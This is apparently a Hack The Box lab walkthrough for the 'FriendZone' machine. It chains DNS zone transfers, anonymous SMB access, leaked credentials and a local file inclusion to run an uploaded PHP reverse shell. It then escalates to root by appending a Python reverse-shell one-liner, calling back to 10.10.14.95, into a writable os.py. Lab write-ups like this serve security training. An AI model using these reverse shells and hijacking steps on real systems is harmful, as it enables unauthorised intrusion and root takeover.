# FriendZone: Easy

```sh
sudo vim /etc/hosts
# add friendzone.htb

nmap -T4 -p- -A -Pn -v friendzone.htb
```

* open ports & services:

    * 21/tcp: ftp: vsftpd 3.0.3
    * 22/tcp: ssh: OpenSSH 7.6p1 Ubuntu 4
    * 53/tcp: domain: ISC BIND 9.11.3-1ubuntu1.2
    * 80/tcp: http: Apache httpd 2.4.29
    * 139/tcp: netbios-ssn: Samba smbd 3.X: 4.X
    * 443/tcp: ssl/http: Apache httpd 2.4.29
    * 445/tcp: netbios-ssn: Samba smbd 4.7.6-Ubuntu

* the ```nmap``` scan gives the domain name 'friendzone.red' for the webpage on port 443: we can update this subdomain in ```/etc/hosts```

* the ```nmap``` scan also mentions a clock skew, but we can check this later

* checking the ```ftp``` service, anonymous login does not work; we can try other weak creds like 'admin:admin' or 'friendzone:friendzone', but they don't work

* enumerating DNS:

    ```sh
    # check for zone transfers for both domains

    dig axfr @10.129.180.76 friendzone.htb
    # transfer failed

    dig axfr @10.129.180.76 friendzone.red
    # this works
    ```

* zone transfer using ```dig``` for the domain 'friendzone.red' gives us a few additional subdomains:

    * administrator1.friendzone.red
    * hr.friendzone.red
    * uploads.friendzone.red

* we can update these subdomains in ```/etc/hosts```

* checking the webpage on port 80, we have a page titled 'Friend Zone Escape software': the page includes an image and some text; the footer mentions the email address 'info@friendzoneportal.red'

* so this gives us one more domain 'friendzoneportal.red': update it in ```/etc/hosts```

* we can also check for any additional domains for 'friendzoneportal.red' using the same zone transfer method:

    ```sh
    dig axfr @10.129.180.76 friendzoneportal.red
    # this gives more domains
    ```

* the ```dig``` command gives us more domains:

    * admin.friendzoneportal.red
    * files.friendzoneportal.red
    * imports.friendzoneportal.red
    * vpn.friendzoneportal.red

* update the additional domains in ```/etc/hosts```

* enumerating SMB:

    ```sh
    smbclient -N -L //friendzone.htb
    # gives 3 non-default shares
    # 'Files', 'general' and 'Development'

    smbmap -H friendzone.htb
    # Guest session access works

    crackmapexec smb friendzone.htb --shares -u '' -p ''
    # lists shares

    crackmapexec smb friendzone.htb --shares -u 'Guest' -p ''
    # same output

    nmap -T4 -A -Pn -v -p 139,445 --script smb* friendzone.htb
    # share enumeration using nmap
    ```

* ```smbclient``` output gives 3 shares: 'Files' (comment includes the path ```/etc/Files```), 'general' & 'Development'

* ```smbmap``` and ```crackmapexec``` confirm that we have no access to the 'Files' share, read only access to 'general' share, and read & write access to 'Development' share

* SMB enumeration using ```nmap``` scripts gives us some more info: using the script 'smb-enum-shares', we get the paths for each of the shares:

    * Development: ```/etc/Development```
    * Files: ```/etc/hole```
    * general: ```/etc/general```

* we can continue to enumerate the folders for any clues:

    ```sh
    smbclient //friendzone.htb/Files
    # NT_STATUS_ACCESS_DENIED

    smbclient //friendzone.htb/general
    # this works

    dir
    # we have one file 'creds.txt'

    get creds.txt

    exit
    
    smbclient //friendzone.htb/Development
    # this also works

    dir
    # empty

    exit

    cat creds.txt
    # this gives admin creds
    ```

* the 'creds.txt' file from the SMB share has a note saying it is for 'the admin thing', and gives us creds 'admin:WORKWORKHhallelujah@#'

* we can now check the webpages on port 443 for any clues

* checking the webpage 'https://friendzone.red', it has the title 'FriendZone escape software', and the page contains some text and a GIF

* checking the source code for the page shows a comment, which mentions the directory '/js/js'

* navigating to 'https://friendzone.red/js/js', we get a note about testing some functions, and we have encoded text: "VWh0Sm9Nc3FzSDE3NzcxODY4MTdnTkhVdDlIbG00"

* checking the source code for this page gives us another comment, hinting towards 'times and zones'

* for the encoded text blob, we can try decoding it in [Cyberchef](https://cyberchef.org): the auto-decode function decodes it 'from Base64', and gives us the string 'UhtJoMsqsH1777186817gNHUt9Hlm4'

* however, this string does not make any sense and cannot decode it now, so we can check the other webpages meanwhile

* checking the other webpage 'https://friendzoneportal.red', we get a different page, but this also contains some text and a GIF; no other clues are found

* checking 'https://uploads.friendzone.red', we have an upload form asking to upload only image files: we can do some testing on this page:

    * we can try uploading a test image file 'test.jpg', and it works

    * the response page at '/upload.php' also gives us a string: '1777191231'

    * checking the source code of the page, the string changes everytime: so it seems it is likely a timestamp string

    * checking in CyberChef confirms it as it auto-decodes the string 'From UNIX timestamp' to give the time 'Sun 26 April 2026 08:13:51 UTC': the current time

    * in the upload form, if we try to upload any other file type like a PHP reverse shell, it still works, and we get the similar successful upload response

    * however, checking for the files uploaded in the same directory does not give anything

    * it could be the case that these files are uploaded in the SMB shares, but checking the 'general' and 'Development' folders do not show any changes

* checking the string from earlier: 'UhtJoMsqsH1777186817gNHUt9Hlm4': it contains a similar, 10 digit string: this could also be a timestamp-related clue

* extracting & decoding the string '1777186817', we get the timestamp 'Sun 26 April 2026 07:00:17 UTC': maybe this will be of use later

* checking the webpage 'https://hr.friendzone.red', we get a 404 Not Found error

* we can check the other subdomains that we had found earlier as well

* navigating to the domain 'https://vpn.friendzoneportal.red/' gives a 404 Not Found error; we get the same error message for the domains 'https://imports.friendzoneportal.red' and 'https://files.friendzoneportal.red'

* checking the domain 'https://admin.friendzoneportal.red', we get another login page

* if we try the creds found earlier: 'admin:WORKWORKHhallelujah@#': it works

* the login is successful, but we get a note saying the admin page is not developed yet, and to check for the other one: it is referring to the other admin domain: 'https://administrator1.friendzone.red'

* checking the admin webpage 'https://administrator1.friendzone.red/', we get a login form for 'FriendZone'

* the source code does not include any clues

* we can try using the same creds: 'admin:WORKWORKHhallelujah@#': this works

* the login is successful, and we get a message to check the '/dashboard.php' page

* the page 'https://administrator1.friendzone.red/dashboard.php' gives the following context:

    * the page is a smart photo script for 'friendzone corp'

    * the page contains a note saying the app is not tested yet

    * another note mentions 'image_name' parameter is missed: and it needs to be entered to show the image

    * a default parameter format is also mentioned: 'image_id=a.jpg&pagename=timestamp'

* we can try checking the different parameters on this webpage and check for any types of injection attacks:

    * we can try the format '/dashboard.php?image_id=a.jpg&pagename=timestamp', without entering any actual values: this shows an image file, and an error message 'the script include wrong param'; a final access timestamp string is also mentioned: which gives the current UNIX timestamp

    * checking the sourcecode shows the image is 'a.jpg', so we can confirm that the image file is shown

    * as we had uploaded a test image file 'test.jpg' earlier, we can try accessing it

    * if we check the page '/dashboard.php?image_id=test.jpg&pagename=timestamp', we do not get the image file, and we get the same error message with the current timestamp

    * we can try uploading an image file again at 'https://uploads.friendzone.red', and this time, we can note down the timestamp shown at the end

    * if we include the timestamp found in this, in the parameter value: like '/dashboard.php?image_id=test.jpg&pagename=1777196594', it still does not work, and the image is not shown

    * checking the source code again, we can see that the page tries to fetch the image file from '/images' directory

    * checking the '/images' directory, we just have 2 files: 'a.jpg' and 'b.jpg': and both do not contain any clues

* from the two parameters on this page: 'image_id' and 'pagename': the former refers to the name of the image from the '/images' directory

* similarly, the second parameter 'pagename' could be for a name of another page in the same directory

* to confirm this, we can check if a page like '/timestamp' or '/timestamp.php' exists

* navigating to 'https://administrator1.friendzone.red/timestamp.php', we do get a page that shows the current UNIX timestamp: so the 'pagename' parameter just fetches a page from the same directory

* using this logic, we can try using 'pagename' to find other pages in the same directory: if the directory/page exists, we will get a different response

* parameter value fuzzing for 'pagename':

    ```sh
    ffuf -u 'https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=FUZZ' -w /usr/share/wordlists/dirb/common.txt --cookie 'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1'
    # the cookie value is taken from Developer Tools
    # it is required for fuzzing

    ffuf -u 'https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=FUZZ' -w /usr/share/wordlists/dirb/common.txt --cookie 'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -fw 38 -s
    # filter with the correct size

    ffuf -u 'https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=FUZZ' -w /usr/share/wordlists/dirb/big.txt --cookie 'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -fw 38 -s
    # testing with a bigger wordlist

    ffuf -u 'https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt --cookie 'FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -fw 38 -s
    # test with other wordlists as well
    ```

* we do not get any other pages in the same directory, except for '/login.php', '/dashboard.php' & '/timestamp.php': which are already known

* if we check the '/login.php' page in the 'pagename' parameter, using this URL: 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login', we get the message 'Wrong!'

* this is the same message that we get when we visit 'https://administrator1.friendzone.red/login.php'

* this indicates that LFI is working, but we need a valid PHP file for it to work

* from the SMB shares listed earlier, we know that the 'Development' share, which has the filepath ```/etc/Development```, can be written to, as we have read+write access

* so, we can upload a PHP reverse shell file to this share; then we can try accessing it using the 'pagename' parameter:

    * upload a PHP reverse shell to the 'Development' share:

        ```sh
        cp /usr/share/webshells/php/php-reverse-shell.php revshell.php

        vim revshell.php
        # update the IP and port values

        smbclient //friendzone.htb/Development

        dir

        put revshell.php
        # this works

        exit
        ```

        ```sh
        nc -nvlp 4444
        # setup listener
        ```
    
    * next, we can try the LFI technique for the PHP file at ```/etc/Development```, by modifying the 'pagename' parameter to '/etc/Development/revshell.php'

    * so, we can navigate to 'https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/revshell' (the '.php' in the end is not needed as seen before)

    * this works, the revshell file gets executed, and we get reverse shell on our listener

* in reverse shell:

    ```sh
    id
    # www-data

    pwd
    # '/'

    ls -la

    ls -la /home
    # we have one user 'friend'

    ls -la /home/friend
    # no SSH keys found

    ls -la /var/www
    # check all web related files for any secrets

    ls -la /var/www/admin
    # check all files

    ls -la /var/www/friendzone
    # check all files

    cat /var/www/mysql_data.conf
    # contains creds
    ```

* from the web files, the file ```/var/www/mysql_data.conf``` contains the creds 'friend:Agpyu12!0.213$'

* we can try credential re-use by trying to login as 'friend' via SSH:

    ```sh
    ssh friend@friendzone.htb
    # this works
    
    # the SSH banner mentions 'You have mail'

    ls -la

    cat user.txt
    # user flag

    ls -la /var/mail
    # we have a file

    cat /var/mail/friend
    # empty file

    sudo -l
    # cannot run sudo
    ```

* for basic enumeration, we can use ```linpeas``` - fetch the script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 4.15.0-36-generic, Ubuntu 18.04.1
    * the user 'friend' is part of multiple default groups
    * ```sudo``` version 1.8.21p2
    * Ubuntu OverlayFS exploit CVE-2021-3493 highlighted
    * listening locally on ports 25 & 953
    * group writable files include ```/usr/lib/python2.7/os.py``` &  ```/usr/lib/python2.7/os.pyc```, for group 'friend'
    * non-default directory found in ```/opt```

* we can check the non-default directory in ```/opt```:

    ```sh
    ls -la /opt

    ls -la /opt/server_admin

    cat /opt/server_admin/reporter.py
    ```

    ```py
    #!/usr/bin/python

    import os

    to_address = "admin1@friendzone.com"
    from_address = "admin2@friendzone.com"

    print "[+] Trying to send email to %s"%to_address

    #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

    #os.system(command)

    # I need to edit the script later
    # Sam ~ python developer
    ```

* the Python script ```/opt/server_admin/reporter.py``` imports the ```os``` library, and has 2 addresses defined: but it does not have any other functionality as everything else is commented out

* as checked from ```linpeas``` earlier, we have write permissions over ```/usr/lib/python2.7/os.py``` &  ```/usr/lib/python2.7/os.pyc```, so if the 'reporter.py' script is being run by root, we can use Python library hijacking methods for privesc

* we can check if this Python script is being run as a cronjob, using ```pspy``` - fetch the executable from attacker:

    ```sh
    wget http://10.10.14.95:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* ```pspy``` shows that every couple of minutes, the command ```/usr/bin/python /opt/server_admin/reporter.py``` is executed as a cronjob

* so we can use Python library hijacking technique to create a malicious ```os``` library for privesc:

    * first, we need to check the priority of Python paths by checking the ```PYTHONPATH``` list:

        ```sh
        python -c 'import sys; print("\n".join(sys.path))'
        # since '/usr/bin/python' is used here, and not 'python3'
        ```
    
    * the listing shows ```/usr/lib/python2.7``` at top: which confirms that we have the required priority to ensure our malicious library will be executed

    * on attacker, setup a listener for reverse shell:

        ```sh
        nc -nvlp 5555
        ```
    
    * next, we can append to 'os.py' with a Python2 reverse-shell one-liner:

        ```py
        import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.95",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
        ```

        ```sh
        echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.95",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' >> /usr/lib/python2.7/os.py
        ```
    
    * in a few moments, we get reverse shell on our listener:

        ```sh
        id
        # root

        cat /root/root.txt
        # root flag
        ```
